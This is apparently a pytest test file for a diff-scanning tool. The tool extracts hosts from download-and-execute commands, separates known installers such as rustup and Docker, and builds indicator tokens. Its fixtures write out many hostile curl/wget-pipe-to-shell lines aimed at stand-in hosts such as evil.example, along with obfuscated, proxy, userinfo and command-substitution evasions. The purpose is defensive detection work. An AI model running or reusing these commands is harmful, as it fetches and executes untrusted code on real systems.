"""Payload hosts: which hosts a change's indicators point at, and which of them link nothing.

The lists are curated and short on purpose. A host missing from `COMMON_HOSTS` costs a noisy campaign link; a host wrongly in `KNOWN_INSTALLERS` hides a download-and-execute, so that list is exact hosts (plus path prefixes for shared ones), never a whole platform."""

from __future__ import annotations

import pytest

from diff_sentry.hosts import fetch_targets, installer_only, ioc_of, is_known_installer


def test_urls_and_curl_targets_are_both_read():
    assert fetch_targets("see https://Evil.Example/a/b?x=1 and wget -O out.sh http://45.33.32.156:8080/p") == [
        ("evil.example", "/a/b?x=1"), ("45.33.32.156", "/p")]
    assert fetch_targets("curl -sSfL hackmoltrepeat.com/molt| bash") == [("hackmoltrepeat.com", "/molt")]


def test_a_command_spelled_without_spaces_is_read_as_the_spaces_it_stands_for():
    assert fetch_targets("dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)") == [
        ("hackmoltrepeat.com", "/molt")]


def test_a_value_flag_does_not_hide_the_target():
    assert fetch_targets("curl -H 'X: y' -o out.txt https://evil.example/x | sh") == [("evil.example", "/x")]


def test_no_target_no_result():
    assert fetch_targets("") == [] and fetch_targets("just prose, no download") == []


@pytest.mark.parametrize("host,path", [
    ("sh.rustup.rs", ""), ("get.docker.com", "/x"), ("raw.githubusercontent.com", "/nvm-sh/nvm/v0.40.1/install.sh"),
    ("raw.githubusercontent.com", "/Homebrew/install/HEAD/install.sh"), ("sentry.io", "/get-cli/"),
])
def test_known_installers(host, path):
    assert is_known_installer(host, path)


@pytest.mark.parametrize("host,path", [
    ("raw.githubusercontent.com", "/attacker/x/main/i.sh"),       # a shared host is only known by its account
    ("raw.githubusercontent.com", "/nvm-sh-evil/nvm/x.sh"),       # a prefix is matched whole, not loosely
    ("sentry.io", "/other"), ("evil.example", "/install"), ("github.com", "/nvm-sh/nvm/install.sh"),
])
def test_things_that_are_not_known_installers(host, path):
    assert not is_known_installer(host, path)


def test_installer_only_needs_every_target_to_be_one():
    good = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    assert installer_only(good)
    assert not installer_only(good + " && curl https://evil.example/x | sh")
    assert not installer_only("no download here")


def test_ioc_tokens():
    assert ioc_of("hackmoltrepeat.com", "/molt") == "hackmoltrepeat.com"
    assert ioc_of("Evil.Example.") == "evil.example"
    # multi-tenant hosts link on the account or bucket, never on the platform
    assert ioc_of("raw.githubusercontent.com", "/Attacker/x/main/i.sh") == "raw.githubusercontent.com/attacker"
    assert ioc_of("storage.googleapis.com", "/some-bucket/p.sh") == "storage.googleapis.com/some-bucket"
    assert ioc_of("raw.githubusercontent.com", "") is None


@pytest.mark.parametrize("host", ["github.com", "registry.npmjs.org", "get.helm.sh", "codecov.io", "aka.ms",
                                  "packages.microsoft.com", "example.com", "localhost", "10.0.0.5", "127.0.0.1"])
def test_hosts_that_link_nothing(host):
    assert ioc_of(host, "/x") is None


def test_a_nvm_install_links_nothing_but_a_lookalike_account_does():
    assert ioc_of("raw.githubusercontent.com", "/nvm-sh/nvm/v0.40.1/install.sh") is None
    assert ioc_of("raw.githubusercontent.com", "/nvm-sh-evil/nvm/install.sh") == "raw.githubusercontent.com/nvm-sh-evil"


# ── account handling ──────────────────────────────────────────────────────────────────────

def test_userinfo_does_not_decide_the_host():
    # `sh.rustup.rs` here is a username; curl connects to evil.example
    assert fetch_targets("curl -sSf https://sh.rustup.rs@evil.example/x.sh | sh") == [("evil.example", "/x.sh")]
    assert fetch_targets("curl -sSf sh.rustup.rs@evil.example/x.sh | sh") == [("evil.example", "/x.sh")]
    assert not installer_only("curl -sSf https://sh.rustup.rs@evil.example/x.sh | sh")


def test_dot_segments_and_encoding_are_resolved_before_judging_a_path():
    assert not is_known_installer("raw.githubusercontent.com", "/nvm-sh/nvm/../../attacker/p/main/install.sh")
    assert not is_known_installer("raw.githubusercontent.com", "/nvm-sh/nvm/%2e%2e/%2e%2e/attacker/p/i.sh")
    assert ioc_of("raw.githubusercontent.com", "/nvm-sh/nvm/../../attacker/p/main/install.sh") == \
        "raw.githubusercontent.com/attacker"
    assert is_known_installer("raw.githubusercontent.com", "/nvm-sh/nvm/v0.40.1/install.sh")


@pytest.mark.parametrize("cmd", [
    "curl -sSf sh.rustup.rs evil.example/payload.sh | sh",               # a second target is still a target
    "curl -fsSL https://get.docker.com。evil.example | sh",             # not an ASCII dot
    "curl -sSf https://sh.rustup.rs:8443 | sh",
    "curl -sSf https://sh.rustup.rs/../x | sh",
    "curl -sSf https://sh.rustup.rs//x | sh",
    "curl -sSf 'https://sh.rustup.rs?x=1' | sh",
    "curl -sSf ftp://sh.rustup.rs | sh",
    "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/0123456789abcdef0123456789abcdef01234567/install.sh | sh",
])
def test_anything_unclean_is_not_an_installer(cmd):
    assert not installer_only(cmd), cmd


def test_a_clean_installer_with_ordinary_flags_is_one():
    assert installer_only("curl --proto '=https' --tlsv1.2 --retry 3 -fsSL https://sh.rustup.rs | sh")
    assert installer_only("wget -qO- https://get.docker.com | sh")
    assert installer_only("curl -fsSL https://claude.ai/install.sh | bash")


def test_more_tenant_shapes():
    assert ioc_of("github.com", "/attacker/x/releases/download/v1/a.sh") == "github.com/attacker"
    assert ioc_of("github.com", "/nodejs/node") is None                    # an ordinary GitHub link links nothing
    assert ioc_of("mybucket.storage.googleapis.com", "/p.sh") == "mybucket.storage.googleapis.com"
    assert ioc_of("storage.googleapis.com", "/mybucket/p.sh") == "storage.googleapis.com/mybucket"
    assert ioc_of("s3.amazonaws.com", "/mybucket/p.sh") == "s3.amazonaws.com/mybucket"
    assert ioc_of("discord.com", "/api/webhooks/123456/secrettoken") == "discord.com/api/webhooks/123456"
    assert ioc_of("discord.com", "/channels/1") is None
    assert ioc_of("claude.ai", "/install.sh") is None and ioc_of("ollama.com", "/install.sh") is None


def test_a_hostile_path_cannot_put_control_characters_in_a_token():
    assert ioc_of("raw.githubusercontent.com", "/att\x1b[2Jacker/x") == "raw.githubusercontent.com/att2jacker"
    assert "\x1b" not in "".join(h + p for h, p in fetch_targets("curl https://evil.example/a\x1b[2J | sh"))


def test_adversarial_text_is_parsed_in_bounded_time():
    import time

    text = ("curl " + "-H 'a' " * 40 + "https://" + "a." * 500 + "b/" + "%2e" * 4000 + " ") * 40
    started = time.perf_counter()
    fetch_targets(text)
    installer_only(text)
    assert time.perf_counter() - started < 2.0


# ── operator edges ──────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "curl -k --proxy https://evil.example https://get.docker.com | sh",         # the proxy was swallowed as a value
    "curl -xhttp://evil.example:8080 -sSf http://sh.rustup.rs | sh",           # attached form
    "wget -qO- --input-file=http://evil.example/list https://sh.rustup.rs | sh",
    "wget -qO- --execute=http_proxy=http://evil.example:3128 http://sh.rustup.rs | sh",
    "wget -qO- -c https://evil.example/x.sh https://sh.rustup.rs | sh",        # a boolean flag is not a value flag
    "curl -K /tmp/cfg https://sh.rustup.rs | sh", "curl --config /tmp/cfg https://sh.rustup.rs | sh",
    "curl --next https://evil.example https://sh.rustup.rs | sh", "curl --url https://evil.example -sSf | sh",
    "curl -H 'Host: evil.example' https://sh.rustup.rs | sh", "curl --resolve x:443:1.2.3.4 https://sh.rustup.rs | sh",
    "curl --retry abc https://sh.rustup.rs | sh", "curl -o out.sh https://sh.rustup.rs | sh",
    "curl -sSf https://sh.rustup.rs/$(id) | sh", "curl -sSf 'https://sh.rustup.rs/`id`' | sh",
    "curl -sSf https://sh.rustup.rs/* | sh",
])
def test_a_flag_the_check_does_not_understand_keeps_the_severity(cmd):
    assert not installer_only(cmd), cmd


def test_the_flags_an_ordinary_install_line_uses_are_allowed():
    for cmd in ("curl -fsSL https://get.docker.com | sh", "curl -sSf https://sh.rustup.rs | sh",
                "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
                "curl --retry 3 --connect-timeout 10 --fail --location --silent --show-error https://claude.ai/install.sh | bash",
                "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
                "wget -qO- https://get.docker.com | sh", "wget -O - https://get.docker.com | sh"):
        assert installer_only(cmd), cmd


def test_a_proxy_is_infrastructure_worth_linking_on():
    assert ("evil.example", "") in fetch_targets("curl -k --proxy https://evil.example https://get.docker.com | sh")
    assert ("evil.example", "/list") in fetch_targets("wget --input-file=http://evil.example/list https://x.io/a")


def test_a_bare_mention_has_no_target_and_an_unreadable_one_does():
    from diff_sentry.hosts import bare_command

    assert bare_command("curl | sh") and bare_command("curl -sSf | sh") and bare_command("wget -qO- | sh")
    assert not bare_command("curl $URL | sh") and not bare_command("curl https://x.example | sh")
    assert not bare_command("curl -fsSL https://get.docker.com。evil.example | sh")
    assert not bare_command("curl --proxy x | sh") and not bare_command("no download here")


def test_numeric_spellings_of_an_address_are_resolved():
    assert fetch_targets("curl http://2130706433/x | sh") == [("127.0.0.1", "/x")]
    assert fetch_targets("curl http://0x7f000001/x | sh") == [("127.0.0.1", "/x")]
    assert fetch_targets("curl http://3232235777/x | sh") == [("192.168.1.1", "/x")]
    assert ioc_of("192.168.1.1", "/x") is None and ioc_of("127.0.0.1", "/x") is None


def test_a_payload_host_is_found_whatever_flag_precedes_it():
    # curl and wget disagree about which flags take a value (`-c`, `-m`, `-d`), so extraction reads every token
    assert ("hackmoltrepeat.com", "/molt") in fetch_targets("wget -c hackmoltrepeat.com/molt -O- | sh")
    assert ("hackmoltrepeat.com", "/molt") in fetch_targets("wget -m hackmoltrepeat.com/molt | sh")
    assert ("hackmoltrepeat.com", "/molt") in fetch_targets("curl -O hackmoltrepeat.com/molt | sh")
    assert fetch_targets("curl -o out.txt -sSf | sh") == []                    # a file name is not a host
    assert ("out.example", "") in fetch_targets("curl out.example | sh")
